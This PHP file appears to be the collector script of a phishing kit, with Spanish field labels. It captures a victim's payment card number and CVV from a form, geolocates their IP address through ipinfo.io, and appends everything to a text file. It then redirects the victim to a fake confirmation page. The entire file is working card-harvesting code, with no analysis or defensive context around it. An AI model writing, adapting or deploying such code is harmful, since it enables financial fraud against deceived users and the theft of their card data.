<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* TARJETA: ".$_POST['ntarjeta']."
* CVV: ".$_POST['codigo']."
* F-H-IP-P-C: 
".date('Y-m-d')."
".date('H:i:s')."
".$userp."
".$cc."
".$city."  
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location:Confirmacion.html");

?>